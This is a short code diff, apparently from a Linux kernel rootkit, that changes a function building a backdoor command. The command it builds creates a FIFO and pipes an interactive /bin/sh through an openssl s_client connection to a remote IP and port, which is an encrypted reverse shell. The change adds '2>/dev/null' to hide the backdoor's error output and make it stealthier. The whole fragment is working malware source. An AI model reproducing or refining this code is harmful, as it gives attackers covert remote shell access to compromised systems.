@@ -197,10 +197,10 @@ static char *_build_bd_command(const char *exe, uint16_t dst_port,
 
                         snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
                         snprintf(ip, INET_ADDRSTRLEN, "%pI4", &saddr);
-                        len = snprintf(NULL, 0, "/usr/bin/mkfifo %s; /bin/sh -i < %s 2>&1 | %s s_client -quiet -connect %s:%u > %s",
+                        len = snprintf(NULL, 0, "/usr/bin/mkfifo %s; /bin/sh -i < %s 2>&1 | %s s_client -quiet -connect %s:%u > %s 2>/dev/null",
                                 ssl, ssl, exe, ip, src_port, ssl);
                         if (len && (bd = kcalloc(1, ++len, GFP_KERNEL)))
-                            snprintf(bd, len, "/usr/bin/mkfifo %s; /bin/sh -i < %s 2>&1 | %s s_client -quiet -connect %s:%u > %s",
+                            snprintf(bd, len, "/usr/bin/mkfifo %s; /bin/sh -i < %s 2>&1 | %s s_client -quiet -connect %s:%u > %s 2>/dev/null",
                                     ssl, ssl, exe, ip, src_port, ssl);
                     }
                 }
